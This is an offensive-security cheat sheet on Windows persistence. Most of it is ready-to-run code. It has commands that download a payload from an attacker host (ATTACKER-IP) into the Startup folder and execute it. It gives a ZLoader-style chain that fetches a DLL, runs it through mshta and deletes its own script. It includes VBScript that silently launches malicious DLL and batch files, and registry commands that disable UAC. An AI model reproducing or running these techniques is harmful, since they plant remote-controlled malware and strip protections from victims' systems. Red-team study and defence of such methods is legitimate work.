# Windows Persistence

## Run at Startup

```pwsh
# Copy script into Windows Startup folder
cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
powershell Invoke-WebRequest "http://ATTACKER-IP/startup.bat" -OutFile startup.bat
start /b cmd /c ./startup.bat

```

## MSHTA to run VBScript

Source from [Checkpoint ZLoader](https://research.checkpoint.com/2022/can-you-trust-a-files-digital-signature-new-zloader-campaign-exploits-microsofts-signature-verification-putting-users-at-risk/)

```pwsh
# Run manipulated signed DLL with VBScript
cd %APPDATA%
powershell Invoke-WebRequest "http://ATTACKER-IP/malicious-vbsscript.dll" -OutFile malicious-vbsscript.dll
start /b cmd /c %WINDOWS%\System32\mshta.exe %APPDATA%/malicious-vbsscript.dll
# Delete this script
start /b "" cmd /c del "%~f0"&exit /b
```

Abstract malicious-vbsscript.dll derived from a MS signed AppRolver.dll

* Requires manipulation of PE header
* Manipulated checksum
* Manipulated signature size

```vb
...
<script>
Set WshShell = CreateObject ("WScript.Shell")

' Create WscriptSleeper in %TEMP% and run it
Sub Sleep (ms)
  Set fso = CreateObject("Scripting.FileSystemObject")
  Dim sFilePath: sFilePath = fso.GetSpecialFolder(2) & "\WScriptSleeper.vbs"
  If Not fso.FileExists(sFilePath) Then
    Set oFile = fso.CreateTextFile(sFilePath, True)
    oFile.Write "wscript.sleep WScript.Arguments(0)"
    oFile.Close
  End if

  Dim oShell: Set oShell = CreateObject("WScript.Shell")
  oShell.Run sFilePath & " " & ms, 0 , True
End Sub

' Run DLL and BAT at starup
Sleep (1111)
WshShell.run "cmd.exe /c regsvr32 malicious.dll", 0
Sleep (2222)
WshShell.run "cmd.exe /c malicious.bat", 0
window.close()
</script>
```

## Deactivate UAC

* Requires **Admin** permissions (at least locally)
* Use with care, because it might break
  * Settings App (modern UI)
  * Installers
  * MS Store Apps

```pwsh
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0

Restart-Computer
```

```shell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
shutdown /r /t 0
```
